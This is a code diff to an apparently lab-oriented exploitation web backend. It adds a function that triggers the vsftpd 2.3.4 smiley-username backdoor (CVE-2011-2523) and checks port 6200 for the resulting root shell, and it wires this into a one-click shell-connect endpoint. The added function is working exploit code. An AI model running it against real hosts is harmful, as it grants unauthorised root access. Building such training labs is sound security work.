@@ -4582,21 +4582,64 @@ async def exploit_shell_start(req: ExploitRequest, user=Depends(verify_token)):
         return {"error": str(e), "lid": lid, "ok": False}
 
 
+async def _trigger_vsftpd_backdoor(target: str) -> bool:
+    """Send `USER vulnuslab:)` + `PASS x` to vsftpd on port 21 — this triggers
+    CVE-2011-2523 (the smile-username backdoor) which spawns a passwordless
+    root shell on port 6200. Returns True if the backdoor port opens within
+    5 seconds. Used as a reliable fallback when MSF's run-j path is flaky."""
+    import socket as _socket
+    try:
+        reader, writer = await asyncio.open_connection(target, 21)
+        try:
+            await reader.read(512)  # FTP banner
+            writer.write(b"USER vulnuslab:)\r\n")
+            await writer.drain()
+            await asyncio.sleep(1)
+            writer.write(b"PASS anything\r\n")
+            await writer.drain()
+            await asyncio.sleep(2)
+        finally:
+            try: writer.close()
+            except Exception: pass
+        # Probe port 6200 — did the backdoor open?
+        for _ in range(10):
+            try:
+                test = _socket.create_connection((target, 6200), timeout=1)
+                test.close()
+                return True
+            except Exception:
+                await asyncio.sleep(0.5)
+        return False
+    except Exception:
+        return False
+
+
 @app.post("/api/exploit/shell/connect")
 async def exploit_shell_connect(body: dict, user=Depends(verify_token)):
     """Open a TCP connection to a backdoor port that's ALREADY waiting on
     the target (e.g. vsftpd 2.3.4 opens a passwordless root shell on port
     6200 after exploitation). The shell session id (lid) returned here can
     be used with the existing /api/exploit/shell/{lid}/output and /cmd
-    endpoints, so the frontend SHELL panel "just works" the same way it
-    does for our normal reverse-shell listener.
+    endpoints.
 
-    Body: { "target": "lab_metasploitable", "port": 6200 }
+    If the port isn't open YET and target is vsftpd 2.3.4 on port 21,
+    we'll try to trigger the backdoor first via the standard smile-username
+    technique — gives users a reliable "click → shell" demo even when MSF's
+    own exploit path has timing issues.
+
+    Body: { "target": "lab_metasploitable", "port": 6200, "auto_trigger": true }
     """
     target = body.get("target", "")
     port = int(body.get("port", 0))
+    auto_trigger = body.get("auto_trigger", True)
     if not target or not port:
         return {"error": "target + port required"}
+
+    # If the backdoor port isn't open, try to trigger it ourselves before
+    # we attempt the TCP connect. Specifically for vsftpd 2.3.4 → port 6200,
+    # we send a magic FTP login that opens the backdoor.
+    if auto_trigger and port == 6200 and not _check_port_reachable(target, port, timeout=2):
+        await _trigger_vsftpd_backdoor(target)
 
     lid = f"exp_connect_{target}_{port}"
     # Clean up any previous session for the same target:port
